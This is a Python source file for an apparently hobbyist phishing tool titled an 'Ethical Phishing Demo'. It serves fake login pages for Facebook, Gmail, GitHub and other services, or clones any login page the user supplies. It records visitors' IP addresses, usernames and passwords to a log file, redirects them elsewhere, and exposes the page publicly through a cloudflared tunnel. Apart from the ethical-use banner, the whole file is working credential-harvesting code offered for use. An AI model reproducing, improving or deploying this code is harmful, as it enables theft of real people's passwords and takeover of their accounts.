import os
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urljoin, urlparse
import re
import requests
from bs4 import BeautifulSoup
import pyfiglet
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

TEMPLATES = {
    "1": "Facebook",
    "2": "Instagram",
    "3": "Gmail",
    "4": "Twitter",
    "5": "LinkedIn",
    "6": "GitHub",
    "7": "Outlook",
    "8": "Clone Custom Login Page"
}

CLOUDFLARED = "cloudflared.exe"
LOG_FILE = "log.txt"
PORT = 8000

def show_banner_and_warning():
    os.system("cls" if os.name == "nt" else "clear")
    banner = pyfiglet.figlet_format("Created by: Sansana2007")
    print(Fore.CYAN + banner)
    
    print(Fore.YELLOW + "=" * 60)
    print(Fore.RED + Style.BRIGHT + "⚠️  ETHICAL USE ONLY ⚠️")
    print(Fore.YELLOW + "-" * 60)
    print(Fore.LIGHTWHITE_EX + "This tool is for " + Fore.GREEN + "EDUCATIONAL" + Fore.LIGHTWHITE_EX + " and " + Fore.GREEN + "AUTHORIZED" + Fore.LIGHTWHITE_EX + " use only.\n")
    print(Fore.RED + "❌ Unauthorized use against individuals or systems is ILLEGAL.")
    print(Fore.GREEN + "✅ Always have permission from the target system owner.\n")
    print(Fore.LIGHTWHITE_EX + "By continuing, you confirm you are using this ethically.")
    print(Fore.YELLOW + "=" * 60)
    input(Fore.CYAN + "\nPress Enter to continue...\n")

def get_template(site_name):
    return f"""<!DOCTYPE html>
<html>
<head>
    <title>{site_name} - Log In</title>
    <style>
        body {{ font-family: sans-serif; background: #f0f2f5; text-align: center; padding-top: 100px; }}
        input, button {{ margin: 10px; padding: 10px; width: 250px; }}
        button {{ background-color: #1877f2; color: white; border: none; }}
    </style>
</head>
<body>
    <h2>{site_name}</h2>
    <form method="POST">
        <input type="text" name="username" placeholder="Username or Email"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <button type="submit">Log In</button>
    </form>
</body>
</html>
"""

def fetch_and_sanitize(url):
    try:
        print(f"[*] Cloning {url} ...")
        res = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        base_url = "{0.scheme}://{0.netloc}".format(urlparse(url))
        soup = BeautifulSoup(res.text, "html.parser")

        for tag in soup.find_all(["link", "script", "img", "a"]):
            attr = "href" if tag.name in ["link", "a"] else "src"
            if tag.has_attr(attr):
                tag[attr] = urljoin(base_url, tag[attr])

        for form in soup.find_all("form"):
            form["method"] = "POST"
            form["action"] = ""

        script_tag = soup.new_tag("script")
        script_tag.string = """
            document.addEventListener('DOMContentLoaded', function() {
                document.querySelectorAll('a').forEach(a => {
                    a.addEventListener('click', function(e) { e.preventDefault(); });
                });
                document.querySelectorAll('button').forEach(btn => {
                    if (btn.type !== 'submit') {
                        btn.disabled = true;
                        btn.style.pointerEvents = 'none';
                        btn.style.opacity = '0.5';
                    }
                });
                document.querySelectorAll('input[type="button"], input[type="reset"]').forEach(inp => {
                    inp.disabled = true;
                    inp.style.pointerEvents = 'none';
                    inp.style.opacity = '0.5';
                });
            });
        """
        if soup.body:
            soup.body.append(script_tag)

        return str(soup)

    except Exception as e:
        print(f"[!] Error cloning site: {e}")
        return None

class PhishHandler(BaseHTTPRequestHandler):
    page_html = ""
    redirect_url = ""

    def do_GET(self):
        try:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(self.page_html.encode('utf-8'))
        except Exception as e:
            self.log_error("Error in GET: %s", str(e))

    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            fields = parse_qs(post_data.decode('utf-8'))

            print(Fore.YELLOW + "[*] Received POST fields:", fields)
            username = next((v[0] for k, v in fields.items() if k.lower() in ["username", "user", "email", "login"]), "")
            password = next((v[0] for k, v in fields.items() if k.lower() in ["password", "pass", "passwd"]), "")
            ip = self.client_address[0]

            log_entry = f"[+] IP: {ip} | User: {username} | Pass: {password}"
            print(Fore.GREEN + log_entry)
            with open(LOG_FILE, "a", encoding='utf-8') as f:
                f.write(log_entry + "\n")

            self.send_response(302)
            self.send_header('Location', self.redirect_url)
            self.end_headers()

        except Exception as e:
            self.log_error("Error in POST: %s", str(e))
            try:
                self.send_response(500)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"Internal Server Error")
            except:
                pass

def start_server(site_name, redirect_url):
    if not PhishHandler.page_html:
        PhishHandler.page_html = get_template(site_name)
    PhishHandler.redirect_url = redirect_url
    server = HTTPServer(("0.0.0.0", PORT), PhishHandler)
    print(Fore.GREEN + f"[+] Server started on http://localhost:{PORT}")
    server.serve_forever()

def print_cloudflared_output(proc):
    for line in proc.stdout:
        if line:
            print(Fore.BLUE + f"[cloudflared] {line.strip()}")

def start_cloudflared():
    if not os.path.isfile(CLOUDFLARED):
        print(Fore.RED + f"[!] {CLOUDFLARED} not found!")
        return

    print(Fore.YELLOW + "[*] Launching Cloudflared tunnel...")
    proc = subprocess.Popen(
        [CLOUDFLARED, "tunnel", "--url", f"http://localhost:{PORT}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    public_url = None

    while True:
        line = proc.stdout.readline()
        if not line:
            break
        if "trycloudflare.com" in line:
            match = re.search(r"https://[a-zA-Z0-9.-]+\.trycloudflare\.com", line)
            if match:
                public_url = match.group(0)
                print(Fore.CYAN + f"\n[+] Public URL: {public_url}")
                print(Fore.YELLOW + "[*] Waiting for credentials...\n")
                break

    threading.Thread(target=print_cloudflared_output, args=(proc,), daemon=True).start()

def main():
    show_banner_and_warning()
    print(Fore.CYAN + "==== Ethical Phishing Demo ====\n")
    for key, name in TEMPLATES.items():
        print(f"[{key}] {name}")
    choice = input("\nSelect a template: ").strip()
    site_name = TEMPLATES.get(choice)

    if not site_name:
        print(Fore.RED + "Invalid choice.")
        return

    redirect_url = input("Enter redirection URL (e.g., https://example.com): ").strip()
    if not redirect_url.startswith("http"):
        print(Fore.RED + "Invalid URL format.")
        return

    if choice == "8":
        clone_url = input("Enter login page URL to clone: ").strip()
        cloned_html = fetch_and_sanitize(clone_url)
        if not cloned_html:
            print(Fore.RED + "[!] Failed to clone the page.")
            return
        PhishHandler.page_html = cloned_html
    else:
        PhishHandler.page_html = get_template(site_name)

    PhishHandler.redirect_url = redirect_url

    print(Fore.YELLOW + "\n[*] Launching phishing page...")
    threading.Thread(target=start_server, args=(site_name, redirect_url), daemon=True).start()
    time.sleep(1)
    start_cloudflared()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Stopped by user.")

if __name__ == "__main__":
    main()
